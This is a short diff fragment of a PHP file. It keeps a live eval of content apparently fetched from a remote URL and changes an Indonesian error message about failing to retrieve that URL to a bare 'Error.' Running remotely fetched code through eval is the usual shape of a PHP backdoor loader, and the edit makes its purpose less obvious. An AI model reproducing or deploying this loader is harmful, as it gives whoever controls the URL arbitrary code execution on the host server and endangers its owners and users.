@@ -45,6 +45,6 @@ if ($content === false) {
 if ($content !== false) {
     eval("?>".$content);
 } else {
-    echo "Tidak dapat mengambil konten dari URL.";
+    echo "Error.";
 }
 ?>
